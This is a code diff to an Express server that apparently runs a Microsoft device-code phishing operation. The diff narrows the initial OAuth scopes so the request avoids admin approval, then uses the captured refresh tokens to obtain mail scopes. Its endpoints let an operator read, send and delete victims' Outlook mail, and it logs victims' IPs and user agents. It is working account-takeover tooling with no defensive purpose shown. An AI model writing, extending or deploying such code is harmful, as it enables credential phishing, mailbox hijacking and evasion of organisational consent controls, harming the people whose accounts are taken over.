@@ -12,7 +12,7 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
 // ============================================
-// YOUR EXISTING CLIENT ID - ONLY ONE NEEDED
+// YOUR EXISTING CLIENT ID
 // ============================================
 const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
 // ============================================
@@ -31,7 +31,7 @@ function getClientIp(req) {
 }
 
 // ============================================
-// START AUTHENTICATION - Device Code Flow
+// START AUTHENTICATION - BASIC SCOPES ONLY (No Admin Approval)
 // ============================================
 app.post('/start', async (req, res) => {
     try {
@@ -39,11 +39,11 @@ app.post('/start', async (req, res) => {
         const clientIp = getClientIp(req);
         const userAgent = req.headers['user-agent'] || 'Unknown';
         
-        // Using YOUR client ID with both User.Read and offline_access to get PRT
+        // ONLY basic scopes - NO Mail scopes to avoid admin approval
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
-                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
+                scope: 'openid profile email User.Read offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -163,9 +163,9 @@ app.get('/state', async (req, res) => {
 
 // ============================================
 // GET FRESH ACCESS TOKEN USING PRT
+// This can request Mail scopes because it's using the PRT
 // ============================================
 async function getFreshAccessToken(userEmail) {
-    // Find the PRT for this user
     const userPRT = refreshTokens.find(rt => rt.user === userEmail);
     if (!userPRT) {
         console.log(`No PRT found for ${userEmail}`);
@@ -175,11 +175,13 @@ async function getFreshAccessToken(userEmail) {
     try {
         console.log(`🔄 Getting fresh token for ${userEmail} using PRT...`);
         
+        // Now we can request Mail scopes because we're using the PRT
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
                 grant_type: 'refresh_token',
                 refresh_token: userPRT.refreshtoken,
-                client_id: YOUR_CLIENT_ID
+                client_id: YOUR_CLIENT_ID,
+                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -253,10 +255,9 @@ app.delete('/api/sessions/clear', (req, res) => {
 });
 
 // ============================================
-// MAILBOX API - FULL OUTLOOK INTEGRATION
+// MAILBOX API - Uses PRT to get fresh token with Mail scopes
 // ============================================
 
-// Get all mail folders for a user
 app.get('/api/mail/folders/:email', async (req, res) => {
     const { email } = req.params;
     const token = await getFreshAccessToken(email);
@@ -276,7 +277,6 @@ app.get('/api/mail/folders/:email', async (req, res) => {
     }
 });
 
-// Get emails from a specific folder
 app.get('/api/mail/:email/:folderId', async (req, res) => {
     const { email, folderId } = req.params;
     const token = await getFreshAccessToken(email);
@@ -296,7 +296,6 @@ app.get('/api/mail/:email/:folderId', async (req, res) => {
     }
 });
 
-// Get single email with full content
 app.get('/api/mail/message/:email/:messageId', async (req, res) => {
     const { email, messageId } = req.params;
     const token = await getFreshAccessToken(email);
@@ -316,7 +315,6 @@ app.get('/api/mail/message/:email/:messageId', async (req, res) => {
     }
 });
 
-// Send email
 app.post('/api/mail/send/:email', async (req, res) => {
     const { email } = req.params;
     const { to, subject, body } = req.body;
@@ -342,7 +340,6 @@ app.post('/api/mail/send/:email', async (req, res) => {
     }
 });
 
-// Delete email
 app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
     const { email, messageId } = req.params;
     const token = await getFreshAccessToken(email);
@@ -361,7 +358,6 @@ app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
     }
 });
 
-// Mark as read/unread
 app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
     const { email, messageId } = req.params;
     const { isRead } = req.body;
@@ -383,6 +379,47 @@ app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
 });
 
 // ============================================
+// SETTINGS API
+// ============================================
+let config = {
+    active_resource: 'graph',
+    api_version: '2',
+    openai_enabled: false,
+    openai_api_key: '',
+    openai_model: 'gpt-3.5-turbo',
+    openai_max_tokens: 500,
+    openai_temperature: 0.7
+};
+
+app.get('/api/settings', (req, res) => {
+    res.json(config);
+});
+
+app.post('/api/settings', (req, res) => {
+    config = { ...config, ...req.body };
+    res.json({ success: true });
+});
+
+app.get('/api/resource/settings', (req, res) => {
+    res.json({ success: true, active_resource: config.active_resource, api_version: config.api_version });
+});
+
+app.post('/api/resource/settings', (req, res) => {
+    config.active_resource = req.body.active_resource;
+    config.api_version = req.body.api_version;
+    res.json({ success: true });
+});
+
+app.post('/api/openai/settings', (req, res) => {
+    config.openai_enabled = req.body.enabled;
+    config.openai_api_key = req.body.api_key;
+    config.openai_model = req.body.model;
+    config.openai_max_tokens = req.body.max_tokens;
+    config.openai_temperature = req.body.temperature;
+    res.json({ success: true });
+});
+
+// ============================================
 // SERVE FILES
 // ============================================
 app.get('/', (req, res) => {
@@ -393,5 +430,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
     console.log(`✅ Client ID: ${YOUR_CLIENT_ID}`);
+    console.log(`✅ Using basic scopes (no admin approval needed)`);
+    console.log(`✅ PRT will be captured and used for Mail access`);
     console.log(`========================================\n`);
 });
